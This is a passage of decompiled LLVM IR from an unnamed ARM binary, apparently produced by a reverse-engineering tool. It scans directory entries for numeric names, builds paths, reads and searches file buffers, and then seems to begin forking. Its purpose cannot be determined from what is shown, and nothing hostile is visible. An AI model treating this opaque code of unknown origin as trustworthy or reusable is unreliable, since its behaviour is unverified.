bb132:                                            ; preds = %dec_label_pc_dd5c
  %v8_dd64 = icmp eq i8 %v3_dd5c, 32
  %v1_dd68 = add i32 %v0_dd6813, 1
  store i32 %v1_dd68, i32* @r5, align 4
  %v1_dd6c = add i32 %v0_dd6c15, 1
  br i1 %v8_dd64, label %dec_label_pc_dd74, label %dec_label_pc_dd5c

dec_label_pc_dd74:                                ; preds = %bb132, %bb131, %.thread12, %.thread10
  %v1_dd80 = phi i32 [ %v1_dd6814, %.thread12 ], [ %v1_dd34, %.thread10 ], [ %v1_dd34, %bb131 ], [ %v1_dd68, %bb132 ]
  %v0_dd74 = load i32, i32* @r6, align 4
  %v2_dd74 = add i32 %v0_dd74, %v1_dd34
  store i32 %v2_dd74, i32* @r4, align 4
  %v2_dd80 = add i32 %v1_dd80, %v2_dd38
  store i32 0, i32* @r7, align 4
  %v3_dd88 = add i32 %v2_dd80, -545
  %v4_dd88 = inttoptr i32 %v3_dd88 to i8*
  store i8 0, i8* %v4_dd88, align 1
  %v0_dd8c = load i32, i32* @r4, align 4
  %v1_dd90 = inttoptr i32 %v0_dd8c to i8*
  %v2_dd90 = call i32 @function_12324(i8* %v1_dd90)
  store i32 %v2_dd90, i32* @r1, align 4
  %v0_dd9c = load i32, i32* @r4, align 4
  %v3_dda0 = inttoptr i32 %v0_dd9c to i8*
  %v4_dda0 = call i32 @function_12680(i8* %v3_dda0, i32 %v2_dd90, i32 %v2_dc74)
  %v7_dda4 = icmp eq i32 %v4_dda0, -1
  br i1 %v7_dda4, label %dec_label_pc_dcd8.backedge, label %dec_label_pc_ddc0.preheader

dec_label_pc_ddc0.preheader:                      ; preds = %dec_label_pc_dd74
  %v1_dda8 = load i32, i32* @r7, align 4
  %v1_ddac = load i32, i32* @r6, align 4
  %v2_ddac = load i32, i32* @r5, align 4
  %v3_ddac = add i32 %v2_ddac, %v1_ddac
  store i32 %v1_dda8, i32* @lr, align 4
  %v1_ddc046 = add i32 %v3_ddac, 2
  %v2_ddc047 = inttoptr i32 %v1_ddc046 to i8*
  %v3_ddc048 = load i8, i8* %v2_ddc047, align 1
  %v2_ddc450 = icmp eq i8 %v3_ddc048, 0
  %v1_ddc852 = add i32 %v2_ddac, 2
  br i1 %v2_ddc450, label %dec_label_pc_ddf8, label %dec_label_pc_ddd0

dec_label_pc_ddd0:                                ; preds = %dec_label_pc_ddc0.preheader, %dec_label_pc_ddc0.backedge
  %v0_ddf881 = phi i32 [ %v0_ddf879, %dec_label_pc_ddc0.backedge ], [ %v1_dda8, %dec_label_pc_ddc0.preheader ]
  %v0_dde0.pr = phi i32 [ %v0_dde0.pr68, %dec_label_pc_ddc0.backedge ], [ %v1_dda8, %dec_label_pc_ddc0.preheader ]
  %v0_e104 = phi i32 [ %v0_e10471, %dec_label_pc_ddc0.backedge ], [ %v1_dda8, %dec_label_pc_ddc0.preheader ]
  %v0_ddc876 = phi i32 [ %v1_ddc8, %dec_label_pc_ddc0.backedge ], [ %v1_ddc852, %dec_label_pc_ddc0.preheader ]
  %v0_ddf0 = phi i32 [ %v0_ddc0, %dec_label_pc_ddc0.backedge ], [ %v3_ddac, %dec_label_pc_ddc0.preheader ]
  %v1_ddd4.in = phi i8 [ %v3_ddc0, %dec_label_pc_ddc0.backedge ], [ %v3_ddc048, %dec_label_pc_ddc0.preheader ]
  %v7_ddd0 = icmp eq i8 %v1_ddd4.in, 9
  br i1 %v7_ddd0, label %bb134, label %bb133

bb133:                                            ; preds = %dec_label_pc_ddd0
  %v8_ddd4 = icmp eq i8 %v1_ddd4.in, 32
  br i1 %v8_ddd4, label %.thread24, label %dec_label_pc_dde0

.thread24:                                        ; preds = %bb133
  br label %dec_label_pc_ddec

bb134:                                            ; preds = %dec_label_pc_ddd0
  br label %dec_label_pc_ddec

dec_label_pc_dde0:                                ; preds = %bb133
  %v7_dde0 = icmp eq i32 %v0_dde0.pr, 1
  br i1 %v7_dde0, label %dec_label_pc_e104, label %dec_label_pc_dde8

dec_label_pc_dde8:                                ; preds = %dec_label_pc_e104, %dec_label_pc_dde0
  %v0_ddec73 = phi i32 [ %v1_e104, %dec_label_pc_e104 ], [ %v0_e104, %dec_label_pc_dde0 ]
  br label %dec_label_pc_ddec

dec_label_pc_ddec:                                ; preds = %bb134, %.thread24, %dec_label_pc_dde8
  %v0_ddec = phi i32 [ %v0_e104, %.thread24 ], [ %v0_e104, %bb134 ], [ %v0_ddec73, %dec_label_pc_dde8 ]
  %v0_dde0.pr69 = phi i32 [ 1, %.thread24 ], [ 1, %bb134 ], [ 0, %dec_label_pc_dde8 ]
  %v7_ddf4 = icmp sgt i32 %v0_ddec, 6
  br i1 %v7_ddf4, label %dec_label_pc_ddf8, label %dec_label_pc_ddc0.backedge

dec_label_pc_ddf8:                                ; preds = %dec_label_pc_ddc0.backedge, %dec_label_pc_ddec, %dec_label_pc_ddc0.preheader
  %v1_de44 = phi i32 [ %v1_ddc852, %dec_label_pc_ddc0.preheader ], [ %v1_ddc8, %dec_label_pc_ddc0.backedge ], [ %v0_ddc876, %dec_label_pc_ddec ]
  %v0_ddf8 = phi i32 [ %v1_dda8, %dec_label_pc_ddc0.preheader ], [ %v0_ddf879, %dec_label_pc_ddc0.backedge ], [ %v0_ddf881, %dec_label_pc_ddec ]
  %v2_ddf8 = icmp eq i32 %v0_ddf8, 0
  br i1 %v2_ddf8, label %dec_label_pc_dcd8.backedge, label %dec_label_pc_de04

dec_label_pc_de04:                                ; preds = %dec_label_pc_ddf8
  %v2_de0c = add i32 %v1_de44, %v2_dd38
  %v1_de10 = add i32 %v2_de0c, -545
  %v2_de10 = inttoptr i32 %v1_de10 to i8*
  %v3_de10 = load i8, i8* %v2_de10, align 1
  %v2_de14 = icmp eq i8 %v3_de10, 0
  br i1 %v2_de14, label %dec_label_pc_de38, label %bb135

bb135:                                            ; preds = %dec_label_pc_de04
  %v8_de18 = icmp eq i8 %v3_de10, 32
  br i1 %v8_de18, label %dec_label_pc_de38, label %dec_label_pc_de20

dec_label_pc_de20:                                ; preds = %bb135
  %v2_de20 = add i32 %v1_de44, %v1_ddac
  br label %dec_label_pc_de24

dec_label_pc_de24:                                ; preds = %bb136, %dec_label_pc_de20
  %v0_de3027 = phi i32 [ %v1_de30, %bb136 ], [ %v1_de44, %dec_label_pc_de20 ]
  %v0_de24 = phi i32 [ %v1_de24, %bb136 ], [ %v2_de20, %dec_label_pc_de20 ]
  %v1_de24 = add i32 %v0_de24, 1
  %v2_de24 = inttoptr i32 %v1_de24 to i8*
  %v3_de24 = load i8, i8* %v2_de24, align 1
  %v2_de28 = icmp eq i8 %v3_de24, 0
  br i1 %v2_de28, label %.thread26, label %bb136

.thread26:                                        ; preds = %dec_label_pc_de24
  %v1_de3028 = add i32 %v0_de3027, 1
  br label %dec_label_pc_de38

bb136:                                            ; preds = %dec_label_pc_de24
  %v8_de2c = icmp eq i8 %v3_de24, 32
  %v1_de30 = add i32 %v0_de3027, 1
  br i1 %v8_de2c, label %dec_label_pc_de38, label %dec_label_pc_de24

dec_label_pc_de38:                                ; preds = %bb136, %dec_label_pc_de04, %.thread26, %bb135
  %v1_de40 = phi i32 [ %v1_de44, %dec_label_pc_de04 ], [ %v1_de3028, %.thread26 ], [ %v1_de44, %bb135 ], [ %v1_de30, %bb136 ]
  %v2_de40 = add i32 %v1_de40, %v2_dd38
  %v2_de44 = add i32 %v1_de44, %v1_ddac
  store i32 %v2_de44, i32* @r4, align 4
  %v3_de50 = add i32 %v2_de40, -545
  %v4_de50 = inttoptr i32 %v3_de50 to i8*
  store i8 0, i8* %v4_de50, align 1
  %v1_de54 = inttoptr i32 %v2_de44 to i8*
  %v2_de54 = call i32 @function_12324(i8* %v1_de54)
  %v8_de5c = icmp sgt i32 %v2_de54, 15
  br i1 %v8_de5c, label %dec_label_pc_dcd8.backedge, label %dec_label_pc_de60

dec_label_pc_de60:                                ; preds = %dec_label_pc_de38
  %v0_de64 = load i32, i32* @r4, align 4
  %v2_de68 = ptrtoint i32* %stack_var_-56 to i32
  store i32 %v2_de68, i32* @r0, align 4
  %v2_de6c = bitcast i32* %stack_var_-56 to i8*
  %v3_de6c = call i32 @function_1234c(i8* %v2_de6c, i32 %v0_de64)
  br label %dec_label_pc_de70

dec_label_pc_de70.loopexit:                       ; preds = %dec_label_pc_dcd8.backedge, %dec_label_pc_dcd8.preheader
  %.pre = ptrtoint i32* %stack_var_-56 to i32
  %.pre95 = bitcast i32* %stack_var_-56 to i8*
  br label %dec_label_pc_de70

dec_label_pc_de70:                                ; preds = %dec_label_pc_de70.loopexit, %dec_label_pc_de60
  %v1_de80.pre-phi = phi i8* [ %.pre95, %dec_label_pc_de70.loopexit ], [ %v2_de6c, %dec_label_pc_de60 ]
  %v2_de7c.pre-phi = phi i32 [ %.pre, %dec_label_pc_de70.loopexit ], [ %v2_de68, %dec_label_pc_de60 ]
  %v0_de70 = load i32, i32* @r8, align 4
  store i32 %v0_de70, i32* @r0, align 4
  %v1_de74 = call i32 @function_15b20(i32 %v0_de70)
  %v2_de80 = call i32 @function_12324(i8* %v1_de80.pre-phi)
  store i32 %v2_de80, i32* @r4, align 4
  %v2_de84 = icmp eq i32 %v2_de80, 0
  br i1 %v2_de84, label %dec_label_pc_e0dc, label %dec_label_pc_de90

dec_label_pc_de90:                                ; preds = %dec_label_pc_de70
  %v3_de98 = call i32 @function_119d0(i32 6, i32* null)
  store i32 %v3_de98, i32* @r0, align 4
  %v1_de9c = call i32 @function_12bbc(i32 %v3_de98)
  store i32 %v1_de9c, i32* @sb, align 4
  %v2_dea0 = icmp eq i32 %v1_de9c, 0
  br i1 %v2_dea0, label %dec_label_pc_e0d0, label %dec_label_pc_deb0.preheader

dec_label_pc_deb0.preheader:                      ; preds = %dec_label_pc_de90
  store i32 0, i32* @r5, align 4
  %v1_deb441 = inttoptr i32 %v1_de9c to i32*
  %v2_deb442 = call i32 @function_12c08(i32* %v1_deb441)
  %v2_deb844 = icmp eq i32 %v2_deb442, 0
  br i1 %v2_deb844, label %dec_label_pc_e0c4, label %dec_label_pc_dec0.preheader

dec_label_pc_deb0.loopexit:                       ; preds = %dec_label_pc_dec8, %dec_label_pc_ded8, %dec_label_pc_df44
  %v0_deb0 = load i32, i32* @sb, align 4
  %v1_deb4 = inttoptr i32 %v0_deb0 to i32*
  %v2_deb4 = call i32 @function_12c08(i32* %v1_deb4)
  %v2_deb8 = icmp eq i32 %v2_deb4, 0
  br i1 %v2_deb8, label %dec_label_pc_e0c4, label %dec_label_pc_dec0.preheader

dec_label_pc_dec0.preheader:                      ; preds = %dec_label_pc_deb0.preheader, %dec_label_pc_deb0.loopexit
  %v0_dec888 = phi i32 [ %v2_deb4, %dec_label_pc_deb0.loopexit ], [ %v2_deb442, %dec_label_pc_deb0.preheader ]
  br label %dec_label_pc_dec0

dec_label_pc_dec0:                                ; preds = %dec_label_pc_dec0.preheader, %dec_label_pc_e0ac
  %v0_dee0 = phi i32 [ %v0_dec888, %dec_label_pc_dec0.preheader ], [ %v2_e0b8, %dec_label_pc_e0ac ]
  %v0_dec0 = load i32, i32* @r5, align 4
  %v2_dec0 = icmp eq i32 %v0_dec0, 0
  br i1 %v2_dec0, label %dec_label_pc_dec8, label %dec_label_pc_e0c4

dec_label_pc_dec8:                                ; preds = %dec_label_pc_dec0
  %v1_dec8 = add i32 %v0_dee0, 19
  %v2_dec8 = inttoptr i32 %v1_dec8 to i8*
  %v3_dec8 = load i8, i8* %v2_dec8, align 1
  %v4_dec8 = zext i8 %v3_dec8 to i32
  %v1_decc = add nsw i32 %v4_dec8, -48
  %tmp = icmp ugt i32 %v1_decc, 9
  br i1 %tmp, label %dec_label_pc_deb0.loopexit, label %dec_label_pc_ded8

dec_label_pc_ded8:                                ; preds = %dec_label_pc_dec8
  store i32 %v1_dec8, i32* @r7, align 4
  %v3_dee4 = call i32 @function_119d0(i32 6, i32* null)
  store i32 %v2_dc14, i32* @r0, align 4
  %v3_def0 = call i32 @function_1234c(i8* %v3_dc34, i32 %v3_dee4)
  %v2_def8 = call i32 @function_12324(i8* %v3_dc34)
  %v0_defc = load i32, i32* @r7, align 4
  %v1_df00 = load i32, i32* @sl, align 4
  %v2_df00 = add i32 %v1_df00, %v2_def8
  store i32 %v2_df00, i32* @r0, align 4
  %v2_df04 = inttoptr i32 %v2_df00 to i8*
  %v3_df04 = call i32 @function_1234c(i8* %v2_df04, i32 %v0_defc)
  %v2_df0c = call i32 @function_12324(i8* %v3_dc34)
  %v0_df10 = load i32, i32* @r5, align 4
  store i32 %v2_df0c, i32* @r4, align 4
  %v2_df1c = inttoptr i32 %v0_df10 to i32*
  %v3_df1c = call i32 @function_119d0(i32 7, i32* %v2_df1c)
  %v0_df24 = load i32, i32* @r4, align 4
  %v1_df24 = load i32, i32* @sl, align 4
  %v2_df24 = add i32 %v1_df24, %v0_df24
  store i32 %v2_df24, i32* @r0, align 4
  %v2_df28 = inttoptr i32 %v2_df24 to i8*
  %v3_df28 = call i32 @function_1234c(i8* %v2_df28, i32 %v3_df1c)
  store i32 %v2_dc14, i32* @r0, align 4
  store i32 4096, i32* @r2, align 4
  %v3_df38 = call i32 @function_15bdc(i32 %v2_dc14, i32 %v2_dc28, i32 4096)
  %v7_df3c = icmp eq i32 %v3_df38, -1
  br i1 %v7_df3c, label %dec_label_pc_deb0.loopexit, label %dec_label_pc_df44

dec_label_pc_df44:                                ; preds = %dec_label_pc_ded8
  %v0_df44 = load i32, i32* @r5, align 4
  %v2_df4c = inttoptr i32 %v0_df44 to i32*
  %v3_df4c = call i32 @function_119d0(i32 6, i32* %v2_df4c)
  store i32 %v2_dc14, i32* @r0, align 4
  %v3_df58 = call i32 @function_1234c(i8* %v3_dc34, i32 %v3_df4c)
  %v2_df60 = call i32 @function_12324(i8* %v3_dc34)
  %v0_df64 = load i32, i32* @r7, align 4
  %v1_df68 = load i32, i32* @sl, align 4
  %v2_df68 = add i32 %v1_df68, %v2_df60
  store i32 %v2_df68, i32* @r0, align 4
  %v2_df6c = inttoptr i32 %v2_df68 to i8*
  %v3_df6c = call i32 @function_1234c(i8* %v2_df6c, i32 %v0_df64)
  %v2_df74 = call i32 @function_12324(i8* %v3_dc34)
  %v0_df78 = load i32, i32* @r5, align 4
  store i32 %v2_df74, i32* @r4, align 4
  %v2_df84 = inttoptr i32 %v0_df78 to i32*
  %v3_df84 = call i32 @function_119d0(i32 9, i32* %v2_df84)
  %v0_df8c = load i32, i32* @r4, align 4
  %v1_df8c = load i32, i32* @sl, align 4
  %v2_df8c = add i32 %v1_df8c, %v0_df8c
  store i32 %v2_df8c, i32* @r0, align 4
  %v2_df90 = inttoptr i32 %v2_df8c to i8*
  %v3_df90 = call i32 @function_1234c(i8* %v2_df90, i32 %v3_df84)
  store i32 %v2_dc14, i32* @r0, align 4
  %v1_df98 = call i32 @function_12bbc(i32 %v2_dc14)
  store i32 %v1_df98, i32* @r8, align 4
  %v2_df9c = icmp eq i32 %v1_df98, 0
  br i1 %v2_df9c, label %dec_label_pc_deb0.loopexit, label %dec_label_pc_dfa4.preheader

dec_label_pc_dfa4.preheader:                      ; preds = %dec_label_pc_df44
  %v1_dfa836 = inttoptr i32 %v1_df98 to i32*
  %v2_dfa837 = call i32 @function_12c08(i32* %v1_dfa836)
  store i32 %v2_dfa837, i32* @r6, align 4
  %v2_dfac39 = icmp eq i32 %v2_dfa837, 0
  br i1 %v2_dfac39, label %dec_label_pc_e0ac, label %dec_label_pc_dfbcthread-pre-split

dec_label_pc_dfa4.loopexit:                       ; preds = %dec_label_pc_dfc4, %dec_label_pc_e05c
  %v0_dfa4 = load i32, i32* @r8, align 4
  %v1_dfa8 = inttoptr i32 %v0_dfa4 to i32*
  %v2_dfa8 = call i32 @function_12c08(i32* %v1_dfa8)
  store i32 %v2_dfa8, i32* @r6, align 4
  %v2_dfac = icmp eq i32 %v2_dfa8, 0
  br i1 %v2_dfac, label %dec_label_pc_e0ac, label %dec_label_pc_dfbcthread-pre-split

dec_label_pc_dfbcthread-pre-split:                ; preds = %dec_label_pc_dfa4.preheader, %dec_label_pc_dfa4.loopexit
  %v0_dfbc.pr = load i32, i32* @r5, align 4
  br label %dec_label_pc_dfbc

dec_label_pc_dfbc:                                ; preds = %dec_label_pc_dfbcthread-pre-split, %dec_label_pc_e084
  %v0_dfbc = phi i32 [ %v0_dfbc.pr, %dec_label_pc_dfbcthread-pre-split ], [ 1, %dec_label_pc_e084 ]
  %v2_dfbc = icmp eq i32 %v0_dfbc, 0
  br i1 %v2_dfbc, label %dec_label_pc_dfc4, label %dec_label_pc_e0ac

dec_label_pc_dfc4:                                ; preds = %dec_label_pc_dfbc
  %v2_dfc4 = call i32 @function_123b8(i32 %v2_dc28, i32 4096)
  %v0_dfc8 = load i32, i32* @r5, align 4
  %v2_dfd0 = inttoptr i32 %v0_dfc8 to i32*
  %v3_dfd0 = call i32 @function_119d0(i32 6, i32* %v2_dfd0)
  store i32 %v2_dc14, i32* @r0, align 4
  %v3_dfdc = call i32 @function_1234c(i8* %v3_dc34, i32 %v3_dfd0)
  %v2_dfe4 = call i32 @function_12324(i8* %v3_dc34)
  %v0_dfe8 = load i32, i32* @r7, align 4
  %v1_dfec = load i32, i32* @sl, align 4
  %v2_dfec = add i32 %v1_dfec, %v2_dfe4
  store i32 %v2_dfec, i32* @r0, align 4
  %v2_dff0 = inttoptr i32 %v2_dfec to i8*
  %v3_dff0 = call i32 @function_1234c(i8* %v2_dff0, i32 %v0_dfe8)
  %v2_dff8 = call i32 @function_12324(i8* %v3_dc34)
  %v0_dffc = load i32, i32* @r5, align 4
  store i32 %v2_dff8, i32* @r4, align 4
  %v2_e008 = inttoptr i32 %v0_dffc to i32*
  %v3_e008 = call i32 @function_119d0(i32 9, i32* %v2_e008)
  %v0_e010 = load i32, i32* @r4, align 4
  %v1_e010 = load i32, i32* @sl, align 4
  %v2_e010 = add i32 %v1_e010, %v0_e010
  store i32 %v2_e010, i32* @r0, align 4
  %v2_e014 = inttoptr i32 %v2_e010 to i8*
  %v3_e014 = call i32 @function_1234c(i8* %v2_e014, i32 %v3_e008)
  %v2_e01c = call i32 @function_12324(i8* %v3_dc34)
  %v1_e024 = load i32, i32* @sl, align 4
  %v2_e024 = add i32 %v1_e024, %v2_e01c
  store i32 %v2_e024, i32* @r0, align 4
  %v2_e028 = inttoptr i32 %v2_e024 to i8*
  %v3_e028 = call i32 @function_1234c(i8* %v2_e028, i32 ptrtoint (i32* @global_var_19784.21 to i32))
  %v2_e030 = call i32 @function_12324(i8* %v3_dc34)
  %v0_e034 = load i32, i32* @r6, align 4
  %v1_e034 = add i32 %v0_e034, 19
  %v1_e038 = load i32, i32* @sl, align 4
  %v2_e038 = add i32 %v1_e038, %v2_e030
  store i32 %v2_e038, i32* @r0, align 4
  %v2_e03c = inttoptr i32 %v2_e038 to i8*
  %v3_e03c = call i32 @function_1234c(i8* %v2_e03c, i32 %v1_e034)
  store i32 %v2_dc14, i32* @r0, align 4
  store i32 4096, i32* @r2, align 4
  %v3_e04c = call i32 @function_15bdc(i32 %v2_dc14, i32 %v2_dc28, i32 4096)
  %v7_e050 = icmp eq i32 %v3_e04c, -1
  br i1 %v7_e050, label %dec_label_pc_dfa4.loopexit, label %dec_label_pc_e05c

dec_label_pc_e05c:                                ; preds = %dec_label_pc_dfc4
  %v2_e05c = call i32 @function_12324(i8* %v3_dc48)
  store i32 %v2_e05c, i32* @r1, align 4
  %v4_e070 = call i32 @function_12680(i8* %v3_dc48, i32 %v2_e05c, i32 %v2_de7c.pre-phi)
  %v7_e074 = icmp eq i32 %v4_e070, -1
  br i1 %v7_e074, label %dec_label_pc_dfa4.loopexit, label %dec_label_pc_e084

dec_label_pc_e084:                                ; preds = %dec_label_pc_e05c
  %v0_e07c = load i32, i32* @r7, align 4
  %v2_e084 = inttoptr i32 %v0_e07c to i8*
  %v3_e084 = call i32 @function_12448(i8* %v2_e084, i32 10)
  store i32 %v3_e084, i32* @r0, align 4
  %v2_e08c = call i32 @function_14dd8(i32 %v3_e084, i32 9)
  %v0_e090 = load i32, i32* @r8, align 4
  %v1_e094 = inttoptr i32 %v0_e090 to i32*
  %v2_e094 = call i32 @function_12c08(i32* %v1_e094)
  store i32 %v2_e094, i32* @r6, align 4
  %v2_e098 = icmp eq i32 %v2_e094, 0
  store i32 1, i32* @r5, align 4
  br i1 %v2_e098, label %dec_label_pc_e0ac, label %dec_label_pc_dfbc

dec_label_pc_e0ac:                                ; preds = %dec_label_pc_dfa4.loopexit, %dec_label_pc_e084, %dec_label_pc_dfbc, %dec_label_pc_dfa4.preheader
  %v0_e0ac = load i32, i32* @r8, align 4
  %v1_e0b0 = inttoptr i32 %v0_e0ac to i32*
  %v2_e0b0 = call i32 @function_12b8c(i32* %v1_e0b0)
  %v0_e0b4 = load i32, i32* @sb, align 4
  %v1_e0b8 = inttoptr i32 %v0_e0b4 to i32*
  %v2_e0b8 = call i32 @function_12c08(i32* %v1_e0b8)
  %v2_e0bc = icmp eq i32 %v2_e0b8, 0
  br i1 %v2_e0bc, label %dec_label_pc_e0c4, label %dec_label_pc_dec0

dec_label_pc_e0c4:                                ; preds = %dec_label_pc_deb0.loopexit, %dec_label_pc_e0ac, %dec_label_pc_dec0, %dec_label_pc_deb0.preheader
  %v0_e0c4 = load i32, i32* @sb, align 4
  %v1_e0c8 = inttoptr i32 %v0_e0c4 to i32*
  %v2_e0c8 = call i32 @function_12b8c(i32* %v1_e0c8)
  %v0_e0cc = load i32, i32* @r5, align 4
  %v1_e0cc = urem i32 %v0_e0cc, 256
  br label %dec_label_pc_e0d0

dec_label_pc_e0d0:                                ; preds = %dec_label_pc_de90, %dec_label_pc_e0c4
  %storemerge = phi i32 [ %v1_e0cc, %dec_label_pc_e0c4 ], [ 0, %dec_label_pc_de90 ]
  store i32 %storemerge, i32* @r4, align 4
  %v1_e0d4 = call i32 @function_15c0c(i32 1)
  br label %dec_label_pc_e0dc

dec_label_pc_e0dc:                                ; preds = %dec_label_pc_de70, %dec_label_pc_e0d0
  %v1_e0dc = call i32 @function_119f4(i32 6)
  %v1_e0e4 = call i32 @function_119f4(i32 7)
  %v1_e0ec = call i32 @function_119f4(i32 9)
  br label %dec_label_pc_e0f0

dec_label_pc_e0f0:                                ; preds = %dec_label_pc_dca8, %dec_label_pc_e0dc
  %v0_e0f0 = load i32, i32* @r4, align 4
  store i32 %v3_dc00, i32* @r4, align 4
  store i32 %v6_dc00, i32* @r5, align 4
  store i32 %v9_dc00, i32* @r6, align 4
  store i32 %v12_dc00, i32* @r7, align 4
  store i32 %v15_dc00, i32* @r8, align 4
  store i32 %v18_dc00, i32* @sb, align 4
  store i32 %v21_dc00, i32* @sl, align 4
  store i32 %v24_dc00, i32* @fp, align 4
  store i32 %v27_dc00, i32* @lr, align 4
  ret i32 %v0_e0f0

dec_label_pc_e104:                                ; preds = %dec_label_pc_dde0
  %v1_e104 = add i32 %v0_e104, 1
  %v7_e108 = icmp eq i32 %v0_e104, 0
  br i1 %v7_e108, label %dec_label_pc_e110, label %dec_label_pc_dde8

dec_label_pc_e110:                                ; preds = %dec_label_pc_e104
  %v1_e110 = add i32 %v0_ddf0, 3
  %v2_e110 = inttoptr i32 %v1_e110 to i8*
  %v3_e110 = load i8, i8* %v2_e110, align 1
  %v7_e114 = icmp eq i8 %v3_e110, 65
  br i1 %v7_e114, label %dec_label_pc_e128, label %dec_label_pc_e11c

dec_label_pc_e11c:                                ; preds = %dec_label_pc_e110, %dec_label_pc_e128
  %v0_ddf880 = phi i32 [ %v0_ddf881, %dec_label_pc_e110 ], [ 1, %dec_label_pc_e128 ]
  br label %dec_label_pc_ddc0.backedge

dec_label_pc_ddc0.backedge:                       ; preds = %dec_label_pc_e11c, %dec_label_pc_ddec
  %v0_ddf879 = phi i32 [ %v0_ddf880, %dec_label_pc_e11c ], [ %v0_ddf881, %dec_label_pc_ddec ]
  %v0_e10471 = phi i32 [ %v1_e104, %dec_label_pc_e11c ], [ %v0_ddec, %dec_label_pc_ddec ]
  %v0_dde0.pr68 = phi i32 [ 0, %dec_label_pc_e11c ], [ %v0_dde0.pr69, %dec_label_pc_ddec ]
  %v0_ddc0 = add i32 %v0_ddf0, 1
  %v1_ddc0 = add i32 %v0_ddf0, 3
  %v2_ddc0 = inttoptr i32 %v1_ddc0 to i8*
  %v3_ddc0 = load i8, i8* %v2_ddc0, align 1
  %v2_ddc4 = icmp eq i8 %v3_ddc0, 0
  %v1_ddc8 = add i32 %v0_ddc876, 1
  br i1 %v2_ddc4, label %dec_label_pc_ddf8, label %dec_label_pc_ddd0

dec_label_pc_e128:                                ; preds = %dec_label_pc_e110
  store i32 1, i32* @lr, align 4
  br label %dec_label_pc_e11c

dec_label_pc_e130:                                ; preds = %dec_label_pc_dc00
  store i8 48, i8* %stack_var_-72, align 1
  br label %dec_label_pc_dca8

; uselistorder directives
  uselistorder i32 %v1_ddc8, { 1, 0 }
  uselistorder i8 %v3_ddc0, { 1, 0 }
  uselistorder i32 %v0_ddf879, { 1, 0 }
  uselistorder i32 %v1_e104, { 1, 0 }
  uselistorder i32 %v2_e0b8, { 1, 0 }
  uselistorder i32 %v1_de24, { 1, 0 }
  uselistorder i32 %v0_de3027, { 1, 0 }
  uselistorder i32 %v1_de44, { 0, 3, 4, 5, 1, 2 }
  uselistorder i32 %v0_ddec, { 1, 0 }
  uselistorder i32 %v0_ddc876, { 1, 0 }
  uselistorder i32 %v0_e104, { 4, 3, 0, 1, 2 }
  uselistorder i32 %v0_ddf881, { 1, 2, 0 }
  uselistorder i32 %v1_ddc852, { 1, 0 }
  uselistorder i32 %v2_ddac, { 1, 0 }
  uselistorder i32 %v1_dda8, { 3, 1, 0, 2, 4 }
  uselistorder i32 %v1_dd68, { 0, 2, 1 }
  uselistorder i32 %v0_dd6813, { 1, 0 }
  uselistorder i32 %v1_dd34, { 0, 2, 3, 4, 5, 6, 1 }
  uselistorder i32 %v3_dcc8, { 1, 2, 0 }
  uselistorder i8* %v3_dc48, { 1, 0, 2 }
  uselistorder i32 %v2_dc28, { 1, 0, 2, 3 }
  uselistorder i32 %v2_dc14, { 1, 0, 2, 4, 3, 5, 7, 6, 8, 9 }
  uselistorder i8* %stack_var_-585, { 1, 4, 0, 2, 3 }
  uselistorder i8* %stack_var_-72, { 2, 0, 1 }
  uselistorder i32* %stack_var_-56, { 0, 1, 2, 4, 3 }
  uselistorder i32 (i8*, i32, i32)* @function_12584, { 1, 0 }
  uselistorder label %dec_label_pc_e11c, { 1, 0 }
  uselistorder label %dec_label_pc_e0f0, { 1, 0 }
  uselistorder label %dec_label_pc_e0dc, { 1, 0 }
  uselistorder label %dec_label_pc_e0d0, { 1, 0 }
  uselistorder label %dec_label_pc_e0c4, { 1, 2, 0, 3 }
  uselistorder label %dec_label_pc_e0ac, { 1, 2, 0, 3 }
  uselistorder label %dec_label_pc_dfbc, { 1, 0 }
  uselistorder label %dec_label_pc_dfbcthread-pre-split, { 1, 0 }
  uselistorder label %dec_label_pc_dfa4.loopexit, { 1, 0 }
  uselistorder label %dec_label_pc_dec0, { 1, 0 }
  uselistorder label %dec_label_pc_dec0.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_deb0.loopexit, { 2, 1, 0 }
  uselistorder label %dec_label_pc_de38, { 0, 2, 3, 1 }
  uselistorder label %dec_label_pc_ddec, { 2, 0, 1 }
  uselistorder label %dec_label_pc_ddd0, { 1, 0 }
  uselistorder label %dec_label_pc_dd74, { 0, 2, 1, 3 }
  uselistorder label %dec_label_pc_dcd8.backedge, { 2, 1, 3, 0 }
  uselistorder label %dec_label_pc_dd28, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_dcf0, { 1, 0 }
  uselistorder label %dec_label_pc_dca8, { 1, 0 }
}

define i32 @function_e164(i32 %arg1) local_unnamed_addr {
dec_label_pc_e164:
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %stack_var_-8412 = alloca i32, align 4
  %stack_var_-60 = alloca i32, align 4
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-220 = alloca i32, align 4
  %stack_var_-156 = alloca i32, align 4
  %stack_var_-92 = alloca i32, align 4
  %stack_var_-4264 = alloca i32, align 4
  %stack_var_-76 = alloca i32, align 4
  %stack_var_-248 = alloca i32, align 4
  %v2_e174 = call i32 @function_15ad0(i32* null)
  store i32 %v2_e174, i32* @r7, align 4
  %v0_e17c = call i32 @function_14c4c()
  %v7_e180 = icmp eq i32 %v0_e17c, -1
  %. = zext i1 %v7_e180 to i32
  %tmp220 = icmp slt i32 %v0_e17c, 1
  %storemerge184 = select i1 %tmp220, i32 %., i32 1
  store i32 %storemerge184, i32* @r5, align 4
  store i32 ptrtoint (i32* @global_var_22914.101 to i32), i32* %r3.global-to-local, align 4
  %v2_e19c = icmp eq i32 %storemerge184, 0
  store i32 %v0_e17c, i32* @global_var_22914.101, align 4
  br i1 %v2_e19c, label %dec_label_pc_e1b8, label %dec_label_pc_e1a8

dec_label_pc_e1a8:                                ; preds = %dec_label_pc_e390, %dec_label_pc_e164, %dec_label_pc_e270
  %v1_e1b4 = phi i32 [ %v0_e17c, %dec_label_pc_e164 ], [ %v2_e328, %dec_label_pc_e270 ], [ 0, %dec_label_pc_e390 ]
  ret i32 %v1_e1b4

dec_label_pc_e1b8:                                ; preds = %dec_label_pc_e164
  %v2_e1b8 = ptrtoint i32* %stack_var_-248 to i32
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 2, i32* %stack_var_-76, align 4
  %v1_e1cc = call i32 @function_1484c(i32 23)
